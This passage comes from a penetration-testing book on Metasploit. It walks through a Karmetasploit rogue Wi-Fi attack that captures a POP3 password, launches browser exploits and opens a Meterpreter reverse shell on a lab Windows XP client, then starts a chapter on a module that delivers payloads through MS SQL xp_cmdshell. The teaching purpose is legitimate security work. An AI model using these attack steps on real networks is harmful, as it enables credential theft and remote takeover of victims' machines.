class="s25">resource (karma.rc)&gt; use auxiliary/server/capture/pop3 resource (karma.rc)&gt; </span><span class="s24">set SRVPORT 110</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">SRVPORT =&gt; 110</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">resource (karma.rc)&gt; <span class="s24">set SSL false</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">SSL =&gt; false</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">resource (karma.rc)&gt; <span class="s24">run</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s30" style="padding-left: 111pt;text-indent: -33pt;line-height: 72%;text-align: left;">@ <span class="s25">[*] Starting exploit windows/browser/winzip_fileview with payload windows/ meterpreter/reverse_tcp</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] Using URL: http://0.0.0.0:55550/N9wReDJhfKg</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Local IP: http://192.168.1.101:55550/N9wReDJhfKg [*] Server started.</p><p class="s30" style="padding-left: 90pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">[*] Starting handler for windows/meterpreter/reverse_tcp on port 3333 [*] Starting handler for generic/shell_reverse_tcp on port 6666</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 10.0.0.1:3333 [*] Starting the payload handler...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Started reverse handler on 10.0.0.1:6666 [*] Starting the payload handler...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] --- Done, found 15 exploit modules [*] Using URL: http://0.0.0.0:55550/ads</p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Local IP: http://192.168.1.101:55550/ads [*] Server started.</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_496.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 73%;text-align: left;">As you can see, a great deal is happening with the resource file. In this listing, the <span class="s25">LHOST </span>address is set to <span class="s19">10.0.0.1 </span>at <span class="s32">O</span>, the POP3 service (among others) is started at <span class="s32">8</span>, the <span class="s19">autopwn </span>exploits are loaded at <span class="s32">@</span>, and payloads are config- ured at <span class="s32">O</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark348">Credential Harvesting</a><a name="bookmark355">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">When a client connects to our malicious access point, the messages file we are tailing will show us when an IP address is handed out. This is our cue to switch back to <span class="s19">msfconsole </span>to see what is happening. Here, we see that a client connects and is assigned an IP address:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_497.png"/></span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Apr 2 15:07:34 bt dhcpd: DHCPDISCOVER from 00:17:9a:b2:b1:6d via at0</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">Apr 2 15:07:35 bt dhcpd: DHCPOFFER on 10.0.0.100 to 00:17:9a:b2:b1:6d (v-xp-sp2-bare) via at0 Apr 2 15:07:35 bt dhcpd: DHCPREQUEST for 10.0.0.100 (10.0.0.1) from 00:17:9a:b2:b1:6d</p><p class="s25" style="padding-left: 56pt;text-indent: 0pt;line-height: 9pt;text-align: left;">(v-xp-sp2-bare) via at0</p><p class="s25" style="padding-bottom: 4pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Apr 2 15:07:35 bt dhcpd: DHCPACK on 10.0.0.100 to 00:17:9a:b2:b1:6d (v-xp-sp2-bare) via at0</p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_498.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The first thing our target does is open an email client. Karmetasploit is waiting, as shown here:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_499.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] DNS 10.0.0.100:1049 XID 45030 (IN::A time.windows.com)</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] DNS 10.0.0.100:1049 XID 47591 (IN::A pop3.securemail.com)</p><p class="s30" style="padding-bottom: 1pt;padding-left: 78pt;text-indent: 0pt;line-height: 14pt;text-align: left;">O <span class="s25">[*] POP3 LOGIN 10.0.0.100:1102 bsmith / s3cr3tp4s5</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_500.png"/></span></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: left;">The POP3 server configured by Metasploit intercepts the target’s email username and password at <span class="s32">O</span>, because all DNS requests are intercepted by the DNS server that Karmetasploit set up for us.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark349">Getting a Shell</a><a name="bookmark356">&zwnj;</a></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">At this point, the user has no new messages, so he decides to do some web browsing. When the browser opens, a <span class="s19">captive portal </span>is presented to the user, as shown in Figure 12-1.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="407" height="327" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_501.gif"/></span></p><p class="s29" style="padding-top: 5pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure 12-1: Karmetasploit captive portal</p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">As the user sits in front of his computer wondering what’s going on, Karmetasploit is busy configuring the attack to capture cookies; set up fake email, DNS, and other servers; and launch exploits against the client’s browser— all the result of the magic contained in our <span class="s19">karma.rc </span>file.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Of course, some degree of luck is involved in this attack. The browser will display a “Loading” page while exploits are launched. If the user is impa- tient, he may simply close the browser window, which will stop our exploits.</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Next, you can see the massive amount of output that results from this attack:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_502.png"/></span></p><p class="s25" style="padding-top: 1pt;padding-left: 56pt;text-indent: -20pt;line-height: 88%;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; www.microsoft.com:80 GET /isapi/redir.dll Windows IE 6.0 cookies=WT_NVR=0=/:1=downloads:2=downloads/en; WT_FPC=id=111.222.333.444-1008969152</p><p class="s25" style="padding-left: 56pt;text-indent: 0pt;line-height: 87%;text-align: left;">.30063513:lv=1267703430218:ss=1267703362203;MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH= d23f&amp;LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C864 18EBC913CE45C4326AE</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Request &#39;/ads&#39; from 10.0.0.100:1371</p><p class="s30" style="padding-left: 36pt;text-indent: -12pt;line-height: 80%;text-align: left;">O <span class="s25">[*] HTTP REQUEST 10.0.0.100 &gt; adwords.google.com:80 GET /forms.html Windows IE 6.0 cookies= [*] HTTP REQUEST 10.0.0.100 &gt; blogger.com:80 GET /forms.html Windows IE 6.0 cookies=</span></p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; care.com:80 GET /forms.html Windows IE 6.0 cookies=</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; careerbuilder.com:80 GET /forms.html Windows IE 6.0 cookies= [*] HTTP REQUEST 10.0.0.100 &gt; ecademy.com:80 GET /forms.html Windows IE 6.0 cookies=</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; facebook.com:80 GET /forms.html Windows IE 6.0 cookies=</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; www.slashdot.org:80 GET /forms.html Windows IE 6.0 cookies= [*] HTTP REQUEST 10.0.0.100 &gt; www.twitter.com:80 GET /forms.html Windows IE 6.0 cookies= [*] Request &#39;/ads?sessid=V2luZG93czpYUDpTUDI6ZW4tdXM6eDg2Ok1TSUU6Ni4wO1NQMjo%3d&#39; from</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 9pt;text-align: left;">10.0.0.100:1371</p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 12pt;text-align: left;">8 <span class="s25">[*] JavaScript Report: Windows:XP:SP2:en-us:x86:MSIE:6.0;SP2:</span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 11pt;text-align: left;">@ <span class="s25">[*] Responding with exploits</span></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 9pt;text-align: justify;">[*] HTTP REQUEST 10.0.0.100 &gt; www.xing.com:80 GET /forms.html Windows IE 6.0 cookies=</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: justify;">[*] HTTP REQUEST 10.0.0.100 &gt; www.yahoo.com:80 GET /forms.html Windows IE 6.0 cookies= [*] HTTP REQUEST 10.0.0.100 &gt; www.ziggs.com:80 GET /forms.html Windows IE 6.0 cookies= [*] HTTP REQUEST 10.0.0.100 &gt; xing.com:80 GET /forms.html Windows IE 6.0 cookies=</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;text-align: justify;">[*] HTTP REQUEST 10.0.0.100 &gt; yahoo.com:80 GET /forms.html Windows IE 6.0 cookies= [*] HTTP REQUEST 10.0.0.100 &gt; ziggs.com:80 GET /forms.html Windows IE 6.0 cookies= [*] HTTP REQUEST 10.0.0.100 &gt; care.com:80 GET / Windows IE 6.0 cookies=</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">[*] HTTP REQUEST 10.0.0.100 &gt; www.care2.com:80 GET / Windows IE 6.0 cookies=</p><p class="s30" style="padding-top: 1pt;padding-left: 57pt;text-indent: -33pt;line-height: 72%;text-align: justify;">O <span class="s25">[*] HTTP REQUEST 10.0.0.100 &gt; activex.microsoft.com:80 POST /objects/ocget.dll Windows IE 6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=</span></p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 10pt;text-align: justify;">1267703362203; MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;LV=20103&amp;V=3;A=I&amp;I=</p><p class="s25" style="padding-left: 38pt;text-indent: 0pt;line-height: 10pt;text-align: center;">AxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: left;">[*] HTTP 10.0.0.100 attempted to download an ActiveX control</p><p class="s25" style="padding-left: 57pt;text-indent: -21pt;line-height: 87%;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; activex.microsoft.com:80 POST /objects/ocget.dll Windows IE 6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=126770</p><p class="s25" style="padding-left: 57pt;text-indent: -1pt;line-height: 9pt;text-align: left;">3362203; MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;LV=20103&amp;V=3;A=I&amp;I=</p><p class="s25" style="padding-left: 38pt;text-indent: 0pt;line-height: 10pt;text-align: center;">AxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] HTTP 10.0.0.100 attempted to download an ActiveX control</p><p class="s30" style="padding-top: 1pt;padding-left: 36pt;text-indent: -12pt;line-height: 80%;text-align: left;">@ <span class="s25">[*] Sending Internet Explorer COM CreateObject Code Execution exploit HTML to 10.0.0.100:1371... [*] HTTP REQUEST 10.0.0.100 &gt; activex.microsoft.com:80 POST /objects/ocget.dll Windows IE</span></p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 10pt;text-align: left;">1267703362203; MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;LV=20103&amp;V=3;A=I&amp;I=</p><p class="s25" style="padding-left: 38pt;text-indent: 0pt;line-height: 10pt;text-align: center;">AxUFAAAAAAAuBwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE</p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">[*] HTTP 10.0.0.100 attempted to download an ActiveX control</p><p class="s25" style="padding-left: 57pt;text-indent: -21pt;line-height: 87%;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203;</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 87%;text-align: left;">MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAu BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 36pt;text-indent: 0pt;text-align: justify;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 36pt;text-indent: 0pt;line-height: 11pt;text-align: justify;">[*] HTTP 10.0.0.100 attempted to download an ActiveX control</p><p class="s25" style="padding-left: 57pt;text-indent: -21pt;line-height: 87%;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203;</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 87%;text-align: left;">MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAu BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE</p><p class="s25" style="padding-top: 1pt;padding-left: 57pt;text-indent: -21pt;line-height: 87%;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203;</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 87%;text-align: left;">MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAu BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE</p><p class="s25" style="padding-top: 1pt;padding-left: 57pt;text-indent: -21pt;line-height: 87%;text-align: left;">[*] HTTP REQUEST 10.0.0.100 &gt; codecs.microsoft.com:80 POST /isapi/ocget.dll Windows IE 6.0 cookies=WT_FPC=id=111.222.333.444-1008969152.30063513:lv=1267703430218:ss=1267703362203;</p><p class="s25" style="padding-left: 57pt;text-indent: 0pt;line-height: 87%;text-align: left;">MC1=GUID=09633fd2bddcdb46a1fe62cc49fb4ac4&amp;HASH=d23f&amp;LV=20103&amp;V=3; A=I&amp;I=AxUFAAAAAAAu BwAADSAT6RJMarfs902pHsnj0g!!; MUID=C7149D932C86418EBC913CE45C4326AE</p><p class="s25" style="padding-top: 3pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">[*] Sending EXE payload to 10.0.0.100:1371... [*] Sending stage (748032 bytes) to 10.0.0.100</p><p class="s30" style="padding-bottom: 2pt;padding-left: 24pt;text-indent: 0pt;line-height: 13pt;text-align: left;">0 <span class="s25">[*] Meterpreter session 1 opened (10.0.0.1:3333 -&gt; 10.0.0.100:1438)</span></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_503.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;line-height: 77%;text-align: left;">In this output, you can see at <span class="s32">O </span>that Metasploit first lets the client know that various popular websites are in fact located on the attacking machine. Then, at <span class="s32">8</span>, it uses JavaScript to determine the target’s operating system and browser, and responds at <span class="s32">@ </span>with exploits based on that fingerprint. At <span class="s32">O </span>the</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">client is presented with a malicious ActiveX control, resulting in the familiar</p><p style="padding-top: 2pt;padding-left: 90pt;text-indent: 0pt;line-height: 76%;text-align: left;">yellow prompt bar in Internet Explorer, shown at the top of Figure 12-1. You can also see buried in the output at <span class="s32">@ </span>that an exploit was launched against the client. After a brief period, you see at <span class="s32">0 </span>that the exploit was successful</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">and a Meterpreter session has been opened on the target PC!</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Returning to <span class="s19">msfconsole</span>, we can interact with the session that was created and check to see what permissions we have obtained on the target. Remember, when you exploit a browser it’s always a good idea to migrate your process out of the web browser in case it gets closed.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_504.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">meterpreter &gt; <span class="s24">sessions -i 1</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Starting interaction with 1... meterpreter &gt; <span class="s24">sysinfo</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Computer: V-XP-SP2-BARE</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">OS : Windows XP (Build 2600, Service Pack 2). Arch : x86</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Language: en_US meterpreter &gt; <span class="s24">getuid</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Server username: V-XP-SP2-BARE\Administrator meterpreter &gt; <span class="s24">run migrate -f</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] Current server process: jEFiwxBKyjoHGijtP.exe (3448) [*] Spawning a notepad.exe host process...</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">[*] Migrating into process ID 2232</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">[*] New server process: notepad.exe (2232) meterpreter &gt; <span class="s24">screenshot</span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Screenshot saved to: /opt/metasploit3/msf3/rkGrMLPa.jpeg meterpreter &gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_505.png"/></span></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">Because this is a default installation of Windows XP SP2 with the very inse- cure Internet Explorer 6 installed (both of which are highly out of date), the client didn’t even need to accept and install the malicious ActiveX control.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark350">Wrapping Up</a><a name="bookmark357">&zwnj;</a></p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Attacks against wireless networks have been a popular topic for quite some time. Although this attack can take a bit of setup, imagine its success against a number of similarly configured clients located in a high-traffic or public area. This approach to attacking wireless clients is often popular because it’s easier than a brute force attack against a well-secured wireless infrastructure.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Now that you’ve seen how easy it is to conduct this sort of attack, you’ll probably think twice about using public wireless networks. Are you sure that the coffee shop is offering “free public Wi-Fi”? Or perhaps someone is run- ning Karmetasploit?</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 211pt;text-indent: 0pt;text-align: left;"><span><img width="134" height="125" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_506.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 100pt;text-indent: 0pt;text-align: left;"><a name="bookmark358">BUILDING YOUR OWN MODULE </a><a name="bookmark369">&zwnj;</a><a name="bookmark370">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Building your own Metasploit module is relatively simple, as long as you have some programming experi- ence and an idea of what you want to build. Because Metasploit is primarily Ruby-based, we’ll be working in the Ruby programming language in this chapter. If you aren’t a Ruby ninja yet, but you have some exposure</p><p style="padding-top: 1pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">to the language, don’t fret; continue to practice and learn. It’s fairly easy to learn Ruby as you go. If you find yourself struggling with the concepts in this chapter, skip it for now, try to build up your Ruby knowledge, and revisit the chapter.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">In this chapter, we’ll write a module called <span class="s19">mssql_powershell </span>to harness a technique released at the Defcon 18 Hacking Conference by Josh Kelley</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">(winfang) and David Kennedy. This module targets Windows platforms with Microsoft’s PowerShell installed (the default on Windows 7).</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">This module converts a standard MSF binary payload to a <span class="s19">hex-blob </span>(a hexadecimal representation of binary data) that can be transmitted to a tar- get system through Microsoft SQL commands. Once this payload is on the target system, a PowerShell script is used to convert the hexadecimal data back to a binary executable, execute it, and deliver a shell to the attacker. This module is already in Metasploit and was developed by one of the authors of this book; it’s a great lesson on how to build your own modules.</p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The ability to convert a binary to hexadecimal, transmit it via MS SQL, and convert it back to binary is an excellent example of how powerful the Metasploit Framework can be. As you’re performing penetration tests, you will encounter many unfamiliar scenarios or situations; your ability to create or modify modules and exploits on the fly will give you that needed edge. As you begin to understand the Framework, you’ll be able to write these types of modules in a relatively short amount of time.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark359">Getting Command Execution on Microsoft SQL</a><a name="bookmark371">&zwnj;</a></p><p style="padding-top: 8pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">As mentioned in Chapter 6, most system administrators set the <span class="s19">sa </span>(system administrator) account password to something weak, not realizing the impact of this simple mistake. The <span class="s19">sa </span>account is installed by default with the SQL role of <span class="s19">sysadmin</span>, and when you’re performing penetration tests, you can almost guarantee that a weak or blank <span class="s19">sa </span>account will exist on Microsoft SQL Server instances. We will use the MS SQL instance that you built in Appendix A to exploit a situation with our module. As discussed in Chapter 6, you initially scan the system with the Metasploit auxiliary modules and brute force the weak <span class="s19">sa </span>account.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Once you have brute forced the <span class="s19">sa </span>account, you can insert, drop, create, and perform most other tasks you would normally use in MS SQL. This includes calling an extended administrative-level stored procedure called <span class="s25">xp_cmdshell</span>, as discussed in Chapter 6. This stored procedure lets you execute underlying operating system commands under the same security context used by the SQL Server service (for example, Local System).</p><p class="s19" style="padding-top: 9pt;padding-left: 90pt;text-indent: -36pt;text-align: left;"><span class="s22">NOTE </span>MS SQL installs with this stored procedure disabled in SQL Server 2005 and 2008, but you can re-enable it using SQL commands if you have the <span class="p">sysadmin </span>role within MS SQL. For example, you could use <span class="s35">SELECT loginname FROM master..syslogins WHERE sysadmin=1 </span>to view all users with this level of access and then become one of those users. If you have the sysadmin role, you’re almost guaranteed a full-system compromise.</p><p style="padding-top: 6pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">The following listing demonstrates how to run basic commands through Metasploit’s MS SQL modules:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 36pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="517" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_507.png"/></span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 11pt;text-align: left;">O <span class="s25">use msf &gt; </span><span class="s24">use admin/mssql/mssql_exec</span></p><p class="s30" style="padding-left: 24pt;text-indent: 0pt;line-height: 13pt;text-align: left;">8 <span class="s25">msf auxiliary(mssql_exec) &gt; </span><span class="s24">show options</span></p><p class="s25" style="padding-top: 7pt;padding-left: 36pt;text-indent: 0pt;text-align: left;">Module options:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:46.7195pt" cellspacing="0"><tr style="height:10pt"><td style="width:41pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Name</p></td><td style="width:161pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Current Setting</p></td><td style="width:43pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Required</p></td><td style="width:131pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Description</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">----</p></td><td style="width:161pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">---------------</p></td><td style="width:43pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">--------</p></td><td style="width:131pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">-----------</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">CMD</p></td><td style="width:161pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">cmd.exe /c echo OWNED &gt; C:\owned.exe</p></td><td style="width:43pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:131pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Command to execute</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s28" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">PASSWORD</p></td><td style="width:161pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:43pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">no</p></td><td style="width:131pt"><p class="s28" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The password for the</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:161pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:43pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:131pt"><p class="s28" style="padding-left: 12pt;text-indent: 0pt;line-height: 10pt;text-align: left;">specified username</p></td></tr><tr style="height:11pt"><td style="width:41pt"><p class="s28" style="padding-left: 